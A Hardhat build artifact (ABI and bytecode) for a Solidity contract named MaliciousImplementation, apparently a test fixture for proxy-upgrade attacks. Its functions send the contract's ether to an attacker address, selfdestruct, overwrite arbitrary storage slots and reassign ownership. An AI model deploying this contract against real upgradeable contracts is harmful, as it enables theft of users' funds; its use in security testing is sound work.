{
  "_format": "hh-sol-artifact-1",
  "contractName": "MaliciousImplementation",
  "sourceName": "contracts/MaliciousImplementation.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_attacker",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "attacker",
      "outputs": [
        {
          "internalType": "address payable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "destroy",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "drainAll",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "emergencyDrain",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "setOwner",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "slot",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "writeStorage",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516103b13803806103b183398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b61031e806100936000396000f3fe6080604052600436106100595760003560e01c806313af4035146100bf5780632caac08b146100df57806348eb76ee146100f45780637fca72aa1461013057806383197ef01461014f578063b29ac03a1461016457610060565b3661006057005b47156100bd57600080546040516001600160a01b039091169047908381818185875af1925050503d80600081146100b3576040519150601f19603f3d011682016040523d82523d6000602084013e6100b8565b606091505b505050505b005b3480156100cb57600080fd5b506100bd6100da366004610296565b600055565b3480156100eb57600080fd5b506100bd610179565b34801561010057600080fd5b50600054610114906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b34801561013c57600080fd5b506100bd61014b3660046102c6565b9055565b34801561015b57600080fd5b506100bd6101af565b34801561017057600080fd5b506100bd6101bd565b47156101ad5760405132904780156108fc02916000818181858888f193505050501580156101ab573d6000803e3d6000fd5b505b565b6000546001600160a01b0316ff5b47806101fd5760405162461bcd60e51b815260206004820152600a6024820152694e6f2062616c616e636560b01b60448201526064015b60405180910390fd5b600080546040516001600160a01b039091169083908381818185875af1925050503d806000811461024a576040519150601f19603f3d011682016040523d82523d6000602084013e61024f565b606091505b50509050806102925760405162461bcd60e51b815260206004820152600f60248201526e151c985b9cd9995c8819985a5b1959608a1b60448201526064016101f4565b5050565b6000602082840312156102a857600080fd5b81356001600160a01b03811681146102bf57600080fd5b9392505050565b600080604083850312156102d957600080fd5b5050803592602090910135915056fea2646970667358221220223b2b98af2c015716cf918d83cf5e9196fd8cba866f6f399b3bcd57bae5487164736f6c63430008120033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}